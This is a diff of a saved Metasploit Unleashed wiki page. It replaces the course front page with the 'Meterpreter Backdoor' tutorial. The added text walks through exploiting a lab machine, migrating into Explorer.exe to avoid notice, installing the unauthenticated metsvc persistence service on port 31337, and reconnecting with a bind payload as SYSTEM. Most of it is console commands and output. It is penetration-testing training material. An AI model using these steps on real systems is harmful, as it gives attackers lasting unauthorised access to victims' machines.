@@ -2,7 +2,7 @@
 		<!DOCTYPE html>
 		<html xmlns="" xml:lang="en" lang="en" dir="ltr">
 		<head>
-			<title>Metasploit Unleashed</title>
+			<title>Meterpreter Backdoor - Metasploit Unleashed</title>
 			<link rel="stylesheet" href="http://www.offensive-security.com/w/skins/msfu/reset.css" />
 			<link rel="stylesheet" href="http://www.offensive-security.com/w/skins/msfu/style.css" />
 			<link rel="stylesheet" href="http://www.offensive-security.com/w/skins/msfu/main.css" />
@@ -25,10 +25,10 @@
 						
 						<div id="controls">
 									<ul>
-			<li id="ca-nstab-main" class="selected"><a href="Port_Scanners" title="View the content page [c]" accesskey="c">Page</a></li>
-			<li id="ca-talk" class="new"><a href="http://www.offensive-security.com/w/index.php?title=Talk:Main_Page&amp;action=edit&amp;redlink=1" title="Discussion about the content page [t]" accesskey="t">Discussion</a></li>
-			<li id="ca-viewsource"><a href="http://www.offensive-security.com/w/index.php?title=Main_Page&amp;action=edit" title="This page is protected.&#10;You can view its source [e]" accesskey="e">View source</a></li>
-			<li id="ca-history"><a href="http://www.offensive-security.com/w/index.php?title=Main_Page&amp;action=history" title="Past revisions of this page [h]" accesskey="h">History</a></li>
+			<li id="ca-nstab-main" class="selected"><a href="Meterpreter_Backdoor" title="View the content page [c]" accesskey="c">Page</a></li>
+			<li id="ca-talk" class="new"><a href="http://www.offensive-security.com/w/index.php?title=Talk:Meterpreter_Backdoor&amp;action=edit&amp;redlink=1" title="Discussion about the content page [t]" accesskey="t">Discussion</a></li>
+			<li id="ca-viewsource"><a href="http://www.offensive-security.com/w/index.php?title=Meterpreter_Backdoor&amp;action=edit" title="This page is protected.&#10;You can view its source [e]" accesskey="e">View source</a></li>
+			<li id="ca-history"><a href="http://www.offensive-security.com/w/index.php?title=Meterpreter_Backdoor&amp;action=history" title="Past revisions of this page [h]" accesskey="h">History</a></li>
 		</ul>
 							
 							<div class="portlet" id="p-personal">
@@ -57,36 +57,352 @@
 						<a id="top"></a>
 						
 						<div id="content">
-							<h1>Metasploit Unleashed</h1>
+							<h1>Meterpreter Backdoor</h1>
 						
 							<div id="siteSub">From Metasploit Unleashed</div>
 							<div id="contentSub"></div>
-																													<div id="jump-to-nav">Jump to: <a href="Port_Scanners#column-one">navigation</a>, <a href="Port_Scanners#searchInput">search</a></div>
+																													<div id="jump-to-nav">Jump to: <a href="Meterpreter_Backdoor#column-one">navigation</a>, <a href="Meterpreter_Backdoor#searchInput">search</a></div>
 														<!-- start content -->
-							<div id="mw-content-text" lang="en" dir="ltr" class="mw-content-ltr"><p>This free information security training is brought to you in a community effort to promote awareness and raise funds for underprivileged children in East Africa. Through a heart-warming effort by several security professionals, we are proud to present the most complete and in-depth open course about the Metasploit Framework.
+							<div id="mw-content-text" lang="en" dir="ltr" class="mw-content-ltr"><p><br />
+</p>
+<table id="toc" class="toc"><tr><td><div id="toctitle"><h2>Contents</h2></div>
+<ul>
+<li class="toclevel-1 tocsection-1"><a href="Meterpreter_Backdoor#Meterpreter_Backdoor"><span class="tocnumber">1</span> <span class="toctext">Meterpreter Backdoor</span></a></li>
+<li class="toclevel-1 tocsection-2"><a href="Meterpreter_Backdoor#Interacting_with_Metsvc"><span class="tocnumber">2</span> <span class="toctext">Interacting with Metsvc</span></a></li>
+</ul>
+</td></tr></table>
+<p><br />
+</p>
+<h2> <span class="mw-headline" id="Meterpreter_Backdoor"> Meterpreter Backdoor </span></h2>
+<p>After going through all the hard work of exploiting a system, it's often a good idea to leave yourself an easier way back into the system later. This way, if the service you exploited is down or patched, you can still gain access to the system. To read about the original implementation of metsvc, go to <a rel="nofollow" class="external free" href="http://www.phreedom.org/software/metsvc/">http://www.phreedom.org/software/metsvc/</a>.
+<br />
+<br />
+Using the metsvc backdoor, you can gain a Meterpreter shell at any point.
+<br />
+<br />
+One word of warning here before we go any further. Metsvc as shown here requires no authentication. This means that anyone that gains access to the port could access your back door! This is not a good thing if you are conducting a penetration test, as this could be a significant risk. In a real world situation, you would either alter the source to require authentication, or filter out remote connections to the port through some other method.
+<br />
+<br />
+First, we exploit the remote system and migrate to the 'Explorer.exe' process in case the user notices the exploited service is not responding and decides to kill it.
+<br />
+<br />
+<pre>msf exploit(<span style='color:#ff0000;'>3proxy</span>) > <span style='color:#13C16A;'>exploit</span>
+
+<span style='color:#0000FF;'>[*]</span> Started reverse handler
+<span style='color:#0000FF;'>[*]</span> Trying target Windows XP SP2 - English...
+<span style='color:#0000FF;'>[*]</span> Sending stage (719360 bytes)
+<span style='color:#0000FF;'>[*]</span> Meterpreter session 1 opened (192.168.1.101:4444 -> 192.168.1.104:1983)
+
+<u>meterpreter</u> > <span style='color:#13C16A;'>ps</span>
+
+Process list
+============
+
+    PID   Name                 Path
+    ---   ----                 ----
+    132   ctfmon.exe           C:\WINDOWS\system32\ctfmon.exe
+    176   svchost.exe          C:\WINDOWS\system32\svchost.exe
+    440   VMwareService.exe    C:\Program Files\VMware\VMware Tools\VMwareService.exe
+    632   Explorer.EXE         C:\WINDOWS\Explorer.EXE
+    796   smss.exe             \SystemRoot\System32\smss.exe
+    836   VMwareTray.exe       C:\Program Files\VMware\VMware Tools\VMwareTray.exe
+    844   VMwareUser.exe       C:\Program Files\VMware\VMware Tools\VMwareUser.exe
+    884   csrss.exe            \??\C:\WINDOWS\system32\csrss.exe
+    908   winlogon.exe         \??\C:\WINDOWS\system32\winlogon.exe
+    952   services.exe         C:\WINDOWS\system32\services.exe
+    964   lsass.exe            C:\WINDOWS\system32\lsass.exe
+    1120  vmacthlp.exe         C:\Program Files\VMware\VMware Tools\vmacthlp.exe
+    1136  svchost.exe          C:\WINDOWS\system32\svchost.exe
+    1236  svchost.exe          C:\WINDOWS\system32\svchost.exe
+    1560  alg.exe              C:\WINDOWS\System32\alg.exe
+    1568  WZCSLDR2.exe         C:\Program Files\ANI\ANIWZCS2 Service\WZCSLDR2.exe
+    1596  jusched.exe          C:\Program Files\Java\jre6\bin\jusched.exe
+    1656  msmsgs.exe           C:\Program Files\Messenger\msmsgs.exe
+    1748  spoolsv.exe          C:\WINDOWS\system32\spoolsv.exe
+    1928  jqs.exe              C:\Program Files\Java\jre6\bin\jqs.exe
+    2028  snmp.exe             C:\WINDOWS\System32\snmp.exe
+    2840  3proxy.exe           C:\3proxy\bin\3proxy.exe
+    3000  mmc.exe              C:\WINDOWS\system32\mmc.exe
+
+<u>meterpreter</u> > <span style='color:#13C16A;'>migrate 632</span>
+<span style='color:#0000FF;'>[*]</span> Migrating to 632...
+<span style='color:#0000FF;'>[*]</span> Migration completed successfully.</pre>
+<br />
+Before installing metsvc, let's see what options are available to us.
+<br />
+<br />
+<pre><u>meterpreter</u> > <span style='color:#13C16A;'>run metsvc -h</span>
+<span style='color:#0000FF;'>[*]</span>
+OPTIONS:
+
+    -A        Automatically start a matching multi/handler to connect to the service
+    -h        This help menu
+    -r        Uninstall an existing Meterpreter service (files must be deleted manually)
+
+<u>meterpreter</u> ></pre>
+<br />
+Since we're already connected via a Meterpreter session, we won't set it to connect back to us right away.  We'll just install the service for now.
+<br />
+<br />
+<pre><u>meterpreter</u> > <span style='color:#13C16A;'>run metsvc</span>
+<span style='color:#0000FF;'>[*]</span> Creating a meterpreter service on port 31337
+<span style='color:#0000FF;'>[*]</span> Creating a temporary installation directory C:\DOCUME~1\victim\LOCALS~1\Temp\JplTpVnksh...
+<span style='color:#0000FF;'>[*]</span>  >> Uploading metsrv.dll...
+<span style='color:#0000FF;'>[*]</span>  >> Uploading metsvc-server.exe...
+<span style='color:#0000FF;'>[*]</span>  >> Uploading metsvc.exe...
+<span style='color:#0000FF;'>[*]</span> Starting the service...
+<span style='color:#0000FF;'>[*]</span>      * Installing service metsvc
+ * Starting service
+Service metsvc successfully installed.
+
+<u>meterpreter</u> ></pre>
+<br />
+The service is now installed and waiting for a connection.
+<br />
+</p><p><br />
+</p>
+<h2> <span class="mw-headline" id="Interacting_with_Metsvc"> Interacting with Metsvc </span></h2>
+<p>We will now use the multi/handler with a payload of 'windows/metsvc_bind_tcp' to connect to the remote system. This is a special payload, as typically a Meterpreter payload is multistage, where a minimal amount of code is sent as part of the exploit, and then more is uploaded after code execution has been accomplished.
+<br />
+<br />
+Think of a shuttle rocket, and the booster rockets that are utilized to get the space shuttle into orbit. This is much the same, except instead of extra items being there and then dropping off, Meterpreter starts as small as possible, then adds on. In this case however, the full Meterpreter code has already been uploaded to the remote machine, and there is no need for a staged connection.
+<br />
+<br />
+We set all of our options for 'metsvc_bind_tcp' with the victim's IP address and the port we wish to have the service connect to on our machine.  We then run the exploit.
+<br />
+<br />
+<pre>msf > <span style='color:#13C16A;'>use exploit/multi/handler</span>
+msf exploit(<span style='color:#ff0000;'>handler</span>) > <span style='color:#13C16A;'>set PAYLOAD windows/metsvc_bind_tcp</span>
+PAYLOAD => windows/metsvc_bind_tcp
+msf exploit(<span style='color:#ff0000;'>handler</span>) > <span style='color:#13C16A;'>set LPORT 31337</span>
+LPORT => 31337
+msf exploit(<span style='color:#ff0000;'>handler</span>) > <span style='color:#13C16A;'>set RHOST 192.168.1.104</span>
+RHOST => 192.168.1.104
+msf exploit(<span style='color:#ff0000;'>handler</span>) > <span style='color:#13C16A;'>show options</span>
+
+Module options:
+
+   Name  Current Setting  Required  Description
+   ----  ---------------  --------  -----------
+
+
+Payload options (windows/metsvc_bind_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  thread           yes       Exit technique: seh, thread, process
+   LPORT     31337            yes       The local port
+   RHOST     192.168.1.104    no        The target address
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Wildcard Target
+
+
+msf exploit(<span style='color:#ff0000;'>handler</span>) > <span style='color:#13C16A;'>exploit</span></pre>
+<br />
+Immediately after issuing 'exploit', our metsvc backdoor connects back to us.
+<br />
+<br />
+<pre><span style='color:#0000FF;'>[*]</span> Starting the payload handler...
+<span style='color:#0000FF;'>[*]</span> Started bind handler
+<span style='color:#0000FF;'>[*]</span> Meterpreter session 2 opened (192.168.1.101:60840 -> 192.168.1.104:31337)
+
+<u>meterpreter</u> > <span style='color:#13C16A;'>ps</span>
+
+Process list
+============
+
+   PID   Name               Path                                                  
+   ---   ----               ----                                                  
+   140   smss.exe           \SystemRoot\System32\smss.exe                         
+   168   csrss.exe          \??\C:\WINNT\system32\csrss.exe                       
+   188   winlogon.exe       \??\C:WINNT\system32\winlogon.exe                    
+   216   services.exe       C:\WINNT\system32\services.exe                        
+   228   lsass.exe          C:\WINNT\system32\lsass.exe                           
+   380   svchost.exe        C:\WINNT\system32\svchost.exe                         
+   408   spoolsv.exe        C:\WINNT\system32\spoolsv.exe                         
+   444   svchost.exe        C:\WINNT\System32\svchost.exe                         
+   480   regsvc.exe         C:\WINNT\system32\regsvc.exe                          
+   500   MSTask.exe         C:\WINNT\system32\MSTask.exe                          
+   528   VMwareService.exe  C:\Program Files\VMware\VMware Tools\VMwareService.exe
+   564   metsvc.exe         c:\WINNT\my\metsvc.exe                                
+   588   WinMgmt.exe        C:\WINNT\System32\WBEM\WinMgmt.exe                    
+   676   cmd.exe            C:\WINNT\System32\cmd.exe                             
+   724   cmd.exe            C:\WINNT\System32\cmd.exe                             
+   764   mmc.exe            C:\WINNT\system32\mmc.exe                             
+   816   metsvc-server.exe  c:\WINNT\my\metsvc-server.exe                         
+   888   VMwareTray.exe     C:\Program Files\VMware\VMware Tools\VMwareTray.exe   
+   896   VMwareUser.exe     C:\Program Files\VMware\VMware Tools\VMwareUser.exe   
+   940   firefox.exe        C:\Program Files\Mozilla Firefox\firefox.exe          
+   972   TPAutoConnSvc.exe  C:\Program Files\VMware\VMware Tools\TPAutoConnSvc.exe
+   1000  Explorer.exe       C:\WINNT\Explorer.exe                                 
+   1088  TPAutoConnect.exe  C:\Program Files\VMware\VMware Tools\TPAutoConnect.exe
+
+<u>meterpreter</u> > <span style='color:#13C16A;'>pwd</span>
+C:\WINDOWS\system32
+<u>meterpreter</u> > <span style='color:#13C16A;'>getuid</span>
+Server username: NT AUTHORITY\SYSTEM
+<u>meterpreter</u> ></pre>
+<br />
+And here we have a typical Meterpreter session! Again, be careful with when and how you use this trick. System owners will not be happy if you make an attackers job easier for them by placing such a useful backdoor on the system for them.
 <br />
 <br />
 </p>
-<div class="center"><div class="floatnone"><a href="File:Msfu_logo_3.png" class="image"><img alt="Msfu logo 3.png" src="http://www.offensive-security.com/w/images/f/f6/Msfu_logo_3.png" width="632" height="319" /></a></div></div>
+<hr />
 <p><br />
-<br />
-This is a free online course and if you enjoy it and find it useful, we ask that you make a donation to the HFC (Hackers For Charity), $9.00 will feed a child for a month, so any contribution is welcome. We hope you enjoy this course as much as we enjoyed making it.
-<br />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</p>
+<div class="Total1"><a href="Maintaining_Access" title="Maintaining Access">Maintaining Access</a> &gt; Meterpreter Backdoor</div>
+<p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</p>
+<div class="Total2"><a href="Keylogging" title="Keylogging">Keylogging</a> &#124; <a href="Persistent_Meterpreter_Service" title="Persistent Meterpreter Service">Persistent Meterpreter Service</a> &#124; <strong class="selflink">Meterpreter Backdoor</strong></div>
+<p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</p>
+<div class="Total3"><a href="Interacting_With_Metsvc" title="Interacting With Metsvc">Interacting With Metsvc</a></div>
+<p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 </p>
 <!-- 
 NewPP limit report
-Preprocessor visited node count: 6/1000000
-Preprocessor generated node count: 20/1000000
-Post‐expand include size: 0/2097152 bytes
+Preprocessor visited node count: 555/1000000
+Preprocessor generated node count: 2735/1000000
+Post‐expand include size: 4174/2097152 bytes
 Template argument size: 0/2097152 bytes
-Highest expansion depth: 2/40
+Highest expansion depth: 3/40
 Expensive parser function count: 0/100
 -->
 
-<!-- Saved in parser cache with key MSFU_Mediawiki-msfum_:pcache:idhash:285-0!*!*!*!*!2!* and timestamp 20131123153816 -->
+<!-- Saved in parser cache with key MSFU_Mediawiki-msfum_:pcache:idhash:79-0!*!0!!en!*!* and timestamp 20131123222542 -->
 </div><div class="printfooter">
-Retrieved from "<a href="http://www.offensive-security.com/w/index.php?title=Main_Page&amp;oldid=1597">http://www.offensive-security.com/w/index.php?title=Main_Page&amp;oldid=1597</a>"</div>
-							<div id='catlinks' class='catlinks catlinks-allhidden'></div>							<!-- end content -->
+Retrieved from "<a href="http://www.offensive-security.com/w/index.php?title=Meterpreter_Backdoor&amp;oldid=1510">http://www.offensive-security.com/w/index.php?title=Meterpreter_Backdoor&amp;oldid=1510</a>"</div>
+							<div id='catlinks' class='catlinks'><div id="mw-normal-catlinks" class="mw-normal-catlinks"><a href="Special:Categories" title="Special:Categories">Category</a>: <ul><li><a href="http://www.offensive-security.com/w/index.php?title=Category:Maintaining_Access&amp;action=edit&amp;redlink=1" class="new" title="Category:Maintaining Access (page does not exist)">Maintaining Access</a></li></ul></div></div>							<!-- end content -->
 													</div>
 						
 					</div>
@@ -521,4 +837,4 @@ document.write(unescape("%3Cscript src='" + gaJsHost + "google-analytics.com/ga.
 <script type="text/javascript">
 var pageTracker = _gat._getTracker("UA-1981501-1");
 pageTracker._trackPageview();
-</script><!-- Served in 0.151 secs. --></body></html>
+</script><!-- Served in 0.123 secs. --></body></html>
